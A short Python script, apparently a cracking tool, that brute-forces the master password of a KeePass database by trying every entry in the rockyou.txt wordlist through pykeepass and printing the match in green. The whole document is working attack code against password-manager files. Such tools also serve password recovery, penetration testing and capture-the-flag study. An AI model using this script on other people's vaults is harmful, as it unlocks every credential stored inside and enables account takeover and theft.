from pykeepass import PyKeePass


def print_green(text):
 
    green_color_code = "\033[92m"
    reset_color_code = "\033[0m"
    
    print(f"{green_color_code}{text}{reset_color_code}")

def check_password(kdbx_file, password):
    try:
        kp = PyKeePass(kdbx_file, password=password)
        print("Password is correct!")
        return True
    except Exception as e:
        print("Password is incorrect.")
        return False

kdbx_file = 'path/to/database.kdbx'
with open('/usr/share/wordlists/rockyou.txt', 'r') as f:
    for line in f:
        password = line.strip()
        if check_password(kdbx_file, password):
            print_green(f"Found password: {password}")
            break
